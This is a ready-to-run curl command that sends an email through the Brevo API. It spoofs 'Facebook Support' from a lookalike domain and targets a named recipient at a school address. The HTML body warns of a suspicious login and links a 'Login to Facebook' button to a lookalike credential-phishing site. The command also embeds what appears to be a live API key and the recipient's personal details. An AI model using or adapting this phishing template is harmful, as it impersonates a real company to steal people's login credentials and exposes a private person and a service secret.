curl --request POST \
  --url https://api.brevo.com/v3/smtp/email \
  --header 'accept: application/json' \
  --header 'api-key: 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' \
  --header 'content-type: application/json' \
  --data '{
   "sender":{
      "name":"Facebook Support",
      "email":"noreply@facebook-support.com"
   },
   "to":[
      {
         "email":"jan.vacek@ssps.cz",
         "name":"Vacek Jan"
      }
   ],
   "subject":"2KBB_4",
  "htmlContent": "<html xmlns=\"http://www.w3.org/1999/xhtml\" lang=\"en\" xml:lang=\"en\" xmlns:v=\"urn:schemas-microsoft-com:vml\" xmlns:o=\"urn:schemas-microsoft-com:office:office\"><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" /><meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" /><meta name=\"viewport\" content=\"width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1\" /></head><body topmargin=\"0\" bottommargin=\"0\" rightmargin=\"0\" leftmargin=\"0\"><div align=\"center\"><div align=\"left\"><img height=\"100\" src=\"https://1000logos.net/wp-content/uploads/2016/11/Facebook-Logo-Meaning.jpg\"></div><div><div style=\"font-family: 'Klavika', Arial, sans-serif; font-weight: normal; font-style: normal;  \"><h1>Facebook Account Activity Alert</h1><p>Dear User,</p><p>We have noticed some unusual activity on your Facebook account. It appears that someone has logged into your account from Germany.</p><p>If this was not you, we recommend taking immediate action to secure your account.</p><p>Please click the button below to login to your Facebook account and review your account security settings:</p><br><p><a href=\"http://face-book.mzf.cz/\" style=\"background-color: #4267B2; color: white; padding: 12px 24px; border-radius: 4px; text-decoration: none;\">Login to Facebook</a></p><br><br>To learn how login notifications like this one can help you protect your account information, visit the HelpCenter:<br><a href=\"https://www.facebook.com/help/162968940433354\">https://www.facebook.com/help/162968940433354</a><br><br>Thank you,<br>The Facebook Team<br></div></div></div></body></html>"
}'
